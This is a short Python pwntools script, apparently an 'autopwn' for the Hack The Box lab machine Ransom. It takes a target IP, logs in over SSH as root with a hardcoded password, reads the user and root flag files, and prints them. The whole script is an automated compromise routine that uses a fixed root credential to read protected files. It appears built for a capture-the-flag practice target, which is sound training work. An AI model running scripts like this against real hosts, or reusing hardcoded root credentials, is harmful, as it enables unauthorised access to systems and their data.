from pwn import *
# Coded by vanishyi
# HTB Ransom autopwn
ip = input("put in the target ip address:").replace('\n','')

s = ssh(user='root',host=ip,password='UHC-March-Global-PW!')
a = ('user flag:'+ repr(s['cat /home/htb/user.txt']))
b = ('root flag:'+ repr(s['cat /root/root.txt']))
s.close()
print(a)
print(b)